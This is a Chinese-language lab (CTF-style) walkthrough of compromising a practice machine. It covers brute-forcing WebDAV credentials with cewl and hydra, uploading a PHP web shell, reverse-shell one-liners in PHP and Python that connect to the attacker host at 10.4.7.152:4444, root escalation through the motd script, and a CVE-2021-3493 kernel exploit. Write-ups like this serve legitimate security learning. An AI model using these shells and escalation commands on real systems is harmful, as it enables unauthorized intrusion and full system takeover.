先访问一下 http://10.4.7.153/tips.txt ，提示我们需要在 creds.txt 文件中发现线索

但是在之前的 gobuster 扫描中没有扫描到 creds.txt 文件，这里查了一下别人打靶机的笔记，发现需要使用 nmap 进行 UDP 协议的端口扫描，但是我这里使用 nmap -sU 进行扫描后没有发现其他人笔记中写到的 69 端口 TFTP 服务。

接着访问一下 http://10.4.7.153/webdav ，可以看到需要用户名和密码登录，但是网站没有关于这点的任何提示。那就使用 kali-cewl 工具 先生成字典，再用 hydra 爆破。

cewl 10.4.7.153 -w pass.txt

hydra -L pass.txt -P pass.txt http-get://10.4.7.153/webdav

爆破成功，得到用户名和密码

login: yamdoot
password: Swarg

登录成功后打开发现没有任何有用的文件，但是 webdav 是可以上传文件的

三、GetShell

1 上传反弹shell

关于使用 webdav 协议上传反弹 shell 有很多姿势

1.1 cadaver 工具上传

我们可以通过 cadaver 工具登录 webdav 上传 shell 文件

cadaver http://10.4.7.153/webdav

put /root/Desktop/getshell.php

反弹shell、一句话木马我尝试了很多，但是无论是 nc 还是蚁剑都连接不上，只有 system() 可以使用

<?php system($_GET['cmd']);?>

尝试在这里使用反弹shell连接

php -r '$sock=fsockopen("10.4.7.152",4444);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'

or

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.7.152",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

四、提权

1 ssh登录

先进行一下靶机内部的信息收集

在 /mnt 目录下发现一个加密的文件 /mnt/hell.sh，密文如下

--[----->+<]>---.+++++.+.+++++++++++.--.+++[->+++<]>++.++++++.--[--->+<]>--.-----.++++.

这其实就是使用混淆加密算法Brainfuck加密的，解密一下

得到密文 chitragupt ，猜测应该是某一项服务的密码，从之前 flag 所属的用户可以推测密码应该是属于 inferno 用户的，再结合之前端口扫描时探测到的ssh服务，尝试登录一下

2 提权

该靶机提权的方式有很多种，这里演示几种

2.1 motd 提权

motd是负责 ssh 登录后，页面欢迎语提示语的，用户可以通过配置文件自定义欢迎提示信息。具体配置文件在 /etc/update-motd.d/* ，理论上这个目录下的任意文件都可以。通常修改 00-header 文件即可。

查看 /etc/update-motd.d/00-header 文件是否具有所需的权限

ls -al /etc/update-motd.d/00-header

写入提权脚本，这里有两种思路，一种是直接反弹shell，利用python等脚本。另一种是把修改root密码的脚本写入该文件即可

echo "echo 'root:123456' | sudo chpasswd" >> /etc/update-motd.d/00-header

然后退出 ssh 再次登录，然后即可切换到 root 用户以提权

当然这里我们也可以使用脚本探测当前系统下有哪些文件具有可以用来提权的权限

脚本的项目地址：https://github.com/carlospolop/PEASS-ng

python3 -m http.server 80

2.2 内核漏洞提权

先查看内核版本和系统发行版本

搜索可以提权的漏洞，我这里使用的是CVE-2021-3493，该漏洞可以对 Ubuntu 20.10 以下的版本提权

下载到本地后，先编译成可执行文件，然后再下载到靶机上

赋权执行的时候发现，靶机中的 GNU C 库版本太低，解决方式使用相同版本的依赖库编译，或者在编译的时候将文件运行所需的依赖全部编译进去。我这里选择的是后者

gcc -static -o exp exploit.c

至此，提权成功
